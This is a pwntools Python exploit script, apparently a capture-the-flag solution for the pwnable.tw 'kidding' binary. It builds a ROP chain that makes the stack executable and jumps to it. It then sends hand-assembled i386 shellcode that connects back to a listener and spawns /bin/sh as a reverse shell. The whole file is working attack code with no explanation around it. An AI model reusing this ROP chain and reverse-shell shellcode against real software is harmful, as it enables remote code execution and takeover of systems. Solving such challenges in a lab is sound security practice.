from pwn import *
import sys

kid = ELF("./kidding")


#p = process("./kidding")
#p = remote('chall.pwnable.tw', 10303)
p = remote('localhost', 8888)
#gdb.attach(p)

pop_ecx = 0x080583c9
inc_ecxmem = 0x080842c8 #inc dword ptr [ecx]; ret
jmp_esp = 0x080bd13b

rop = 'a'*0x8
#0x08048902-0x18
rop += p32(0x08048902-0x18) #__libc_stack_end-0x18 # ebp
rop += p32(pop_ecx) + p32(kid.symbols["_dl_make_stack_executable_hook"])
rop += p32(inc_ecxmem) + p32(0x080937f0) #call dl_make_stack_executable_hook
rop += p32(jmp_esp) 

ip = u32(binary_ip("127.0.0.1"))
port = 11111

##sys_socketcall eax=0x66,ebx=0x1,ecx=esp[2,1,0]
sc = "push 0x1;pop ebx;cdq;"
sc += "mov al,0x66;push edx;push ebx;push 0x2;mov ecx,esp;int 0x80;"

##dup2(oldfd,newfd) eax=0x3f,ebx=oldfd,ecx=newfd dup2(0,1)
sc += "pop esi;pop ecx;xchg ebx,eax;mov al,0x3f;int 0x80;"

##socketcall() eax=0x66,ebx=3,sys_connect(0,ip_port,0x10)
sc += "mov al,0x66;push %d;push ax;push si;mov ecx,esp;" % ip
sc += "push 0x10;push ecx;push ebx;mov ecx,esp;mov bl,0x3;int 0x80;"

##execve("/bin/sh") eax=0xb,ebx="/bin/sh"
sc += "mov al,0xb;pop ecx;push 0x68732f;push 0x6e69622f;mov ebx,esp;int 0x80"

shellcode = asm(sc,arch="i386")

listener = listen(port)

#gdb.attach(p)
p.send(rop+shellcode)

listener.interactive()